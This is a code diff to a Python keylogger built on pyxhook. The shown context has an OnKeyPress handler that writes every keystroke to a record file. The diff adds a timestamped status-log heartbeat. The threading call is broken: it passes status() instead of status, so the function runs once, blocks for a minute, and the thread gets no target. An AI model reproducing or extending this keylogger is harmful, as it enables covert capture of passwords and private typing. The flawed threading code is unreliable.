@@ -1,3 +1,6 @@
+import threading
+import time
+
 import pyxhook
 import datetime
 
@@ -11,6 +14,13 @@ with open(recordfile, "a") as f:
     f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M"))
     f.write("\nStarted!\n")
     f.close()
+
+
+def status():
+    with open("status.log", "a") as f:
+        f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M\n"))
+        f.close()
+    time.sleep(60)
 
 
 def OnKeyPress(event):
@@ -35,6 +45,8 @@ def OnKeyPress(event):
         recordKey.write(event.Key)
     recordKey.close()
 
+
+threading.Thread(target=status()).start()
 
 # initiate HookManager class
 hook = pyxhook.HookManager()
